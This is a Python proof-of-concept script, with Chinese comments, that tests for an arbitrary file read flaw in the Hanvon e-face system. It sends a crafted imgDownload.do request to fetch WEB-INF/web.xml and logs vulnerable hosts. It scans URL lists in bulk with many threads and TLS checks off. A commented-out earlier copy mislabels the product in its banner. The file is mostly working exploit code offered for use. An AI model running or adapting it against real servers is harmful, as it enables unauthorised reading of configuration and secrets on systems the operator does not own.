# import argparse, sys, requests
# from multiprocessing.dummy import Pool
# from urllib3.exceptions import InsecureRequestWarning

# # 禁用 SSL 警告
# requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# def banner():
#     test = """
#  ___  ____  ___  ___   ___   ___    __  
# / __)(_  _)/ __)(__ \ | __) / _ \  /. | 
# \__ \ _)(_ \__ \ / _/ |__ \( (_) )(_  _)
# (___/(____)(___/(____)(___/ \___/   (_) 
# """
#     print(test)
#     print("[*] 美特CRM download-new 任意文件读取漏洞检测\n")

# def poc(target):
#     payload = '/manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS'
#     try:
#         # 探测目标是否存活
#         res1 = requests.get(url=target, timeout=5, verify=False)
#         if res1.status_code == 200:
#             res2 = requests.get(url=target + payload, timeout=5, verify=False)
#             # 判断返回内容长度是否大于0，作为存在漏洞的标志
#             if len(res2.text) > 0:
#                 print(f"[+]{target} 存在漏洞")
#                 with open('result.txt', 'a', encoding='utf-8') as f:
#                     f.write(target + '\n')
#             else:
#                 print(f"[-]{target} 不存在漏洞")
#         else:
#             print(f"[*]{target} 访问出现问题，请手工测试")
#     except Exception as e:
#         print(f"[!] {target} 请求异常 -> {e}")

# def main():
#     banner()
#     parse = argparse.ArgumentParser(description="汉王e脸通任意文件读取漏洞")
#     parse.add_argument('-u', '--url', dest='url', type=str, help="请输入目标链接")
#     parse.add_argument('-f', '--file', dest='file', type=str, help="请输入批量URL文件路径")
#     args = parse.parse_args()

#     if args.url and not args.file:
#         poc(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url = url.strip()
#                 if url:
#                     url_list.append(url)
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         print(f"Usage: python {sys.argv[0]} -u http://target 或 -f url.txt")

# if __name__ == '__main__':
#     main()



import argparse, sys, requests
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    test = """"""
    print(test)
    print("[*] 汉王e脸通任意文件读取漏洞检测\n")

def poc(target):
    payload = '/manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS'
    try:
        # 探测目标是否存活
        res1 = requests.get(url=target, timeout=10, verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload, timeout=10, verify=False)
            
            # 直接判断是否成功下载文件
            content_type = res2.headers.get("Content-Type", "").lower()
            content_disp = res2.headers.get("Content-Disposition", "").lower()
            text_lower = res2.text.lower()

            if res2.status_code == 200 and (
                "xml" in content_type or "application/octet-stream" in content_type
                or "attachment" in content_disp
                or "<web-app" in text_lower
            ):
                print(f"[+]{target} 存在漏洞")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f"[-]{target} 不存在漏洞")
        else:
            print(f"[*]{target} 访问出现问题，请手工测试")
    except Exception as e:
        print(f"[!] {target} 请求异常 -> {e}")

def main():
    banner()
    parse = argparse.ArgumentParser(description="汉王e脸通任意文件读取漏洞检测")
    parse.add_argument('-u', '--url', dest='url', type=str, help="请输入目标链接")
    parse.add_argument('-f', '--file', dest='file', type=str, help="请输入批量URL文件路径")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:
                    url_list.append(url)
        mp = Pool(50)  # 可根据网络情况调整线程数
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -u http://target 或 -f url.txt")

if __name__ == '__main__':
    main()
